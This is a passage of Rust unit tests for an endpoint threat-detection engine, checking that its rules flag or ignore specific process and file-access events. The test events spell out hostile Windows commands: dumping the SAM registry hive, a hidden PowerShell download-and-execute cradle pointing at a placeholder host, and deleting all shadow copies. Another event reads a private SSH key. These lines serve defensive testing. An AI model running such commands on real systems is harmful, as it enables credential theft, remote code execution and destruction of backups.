        std::env::set_var("EGUARD_RULES_STAGING_DIR", &staging_dir);

        let sources = DetectionSourcePaths {
            sigma_dir,
            yara_dir,
            ioc_dir,
        };
        let engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);

        assert_eq!(engine.layer1.check_hash("abc123"), Layer1Result::ExactMatch);
        assert_eq!(engine.layer1.check_hash("def456"), Layer1Result::ExactMatch);
        assert_eq!(engine.layer1.check_hash("missing"), Layer1Result::Clean);

        std::env::remove_var("EGUARD_FORCE_LOW_MEMORY_IOC_STORE");
        std::env::remove_var("EGUARD_RULES_STAGING_DIR");
        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_detects_windows_reg_save_sam_command() {
        let base = unique_temp_dir("win-reg-save");
        let sources = DetectionSourcePaths {
            sigma_dir: base.join("sigma"),
            yara_dir: base.join("yara"),
            ioc_dir: base.join("ioc"),
        };
        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");

        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
        let mut event = base_event();
        event.process = "reg.exe".to_string();
        event.parent_process = "cmd.exe".to_string();
        event.command_line = Some("reg save HKLM\\SAM C:\\temp-sam.hiv".to_string());

        let outcome = engine.process_event(&event);
        assert!(outcome
            .temporal_hits
            .iter()
            .any(|hit| hit == "eguard_win_reg_save_sam"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_detects_windows_powershell_download_cradle() {
        let base = unique_temp_dir("win-ps-cradle");
        let sources = DetectionSourcePaths {
            sigma_dir: base.join("sigma"),
            yara_dir: base.join("yara"),
            ioc_dir: base.join("ioc"),
        };
        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");

        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
        let mut event = base_event();
        event.process = "powershell.exe".to_string();
        event.parent_process = "explorer.exe".to_string();
        event.command_line = Some(
            "powershell -nop -w hidden IEX (New-Object Net.WebClient).DownloadString('http://bad')"
                .to_string(),
        );

        let outcome = engine.process_event(&event);
        assert!(outcome
            .temporal_hits
            .iter()
            .any(|hit| hit == "eguard_win_ps_download_cradle"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_detects_windows_shadow_delete_command() {
        let base = unique_temp_dir("win-shadow-delete");
        let sources = DetectionSourcePaths {
            sigma_dir: base.join("sigma"),
            yara_dir: base.join("yara"),
            ioc_dir: base.join("ioc"),
        };
        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");

        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
        let mut event = base_event();
        event.process = "vssadmin.exe".to_string();
        event.parent_process = "cmd.exe".to_string();
        event.command_line = Some("vssadmin delete shadows /all /quiet".to_string());

        let outcome = engine.process_event(&event);
        assert!(outcome
            .temporal_hits
            .iter()
            .any(|hit| hit == "eguard_win_shadow_copy_delete"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_sensitive_file_rule_ignores_benign_non_root_file_reads() {
        let base = unique_temp_dir("benign-file-open");
        let sources = DetectionSourcePaths {
            sigma_dir: base.join("sigma"),
            yara_dir: base.join("yara"),
            ioc_dir: base.join("ioc"),
        };
        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");

        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
        let mut event = base_event();
        event.event_class = EventClass::FileOpen;
        event.process = "hostnamectl".to_string();
        event.parent_process = "bash".to_string();
        event.file_path = Some("/usr/lib64/libseccomp.so.2".to_string());

        let outcome = engine.process_event(&event);
        assert!(outcome
            .temporal_hits
            .iter()
            .all(|hit| hit != "eguard_builtin_sensitive_file_access"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_sensitive_file_rule_matches_real_sensitive_paths() {
        let base = unique_temp_dir("sensitive-file-open");
        let sources = DetectionSourcePaths {
            sigma_dir: base.join("sigma"),
            yara_dir: base.join("yara"),
            ioc_dir: base.join("ioc"),
        };
        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");

        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
        let mut event = base_event();
        event.event_class = EventClass::FileOpen;
        event.process = "cat".to_string();
        event.parent_process = "bash".to_string();
        event.file_path = Some("/home/user/.ssh/id_rsa".to_string());

        let outcome = engine.process_event(&event);
        assert!(outcome
            .temporal_hits
            .iter()
            .any(|hit| hit == "eguard_builtin_sensitive_file_access"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_sensitive_file_rule_ignores_benign_sudo_policy_reads() {
        let base = unique_temp_dir("sudo-policy-read");
        let sources = DetectionSourcePaths {
            sigma_dir: base.join("sigma"),
            yara_dir: base.join("yara"),
            ioc_dir: base.join("ioc"),
        };
        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");

        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
        let mut event = base_event();
        event.event_class = EventClass::FileOpen;
        event.process = "sudo".to_string();
        event.parent_process = "bash".to_string();
        event.file_path = Some("/etc/passwd".to_string());

        let outcome = engine.process_event(&event);
        assert!(outcome
            .temporal_hits
            .iter()
            .all(|hit| hit != "eguard_builtin_sensitive_file_access"));

        let _ = std::fs::remove_dir_all(base);
    }
}
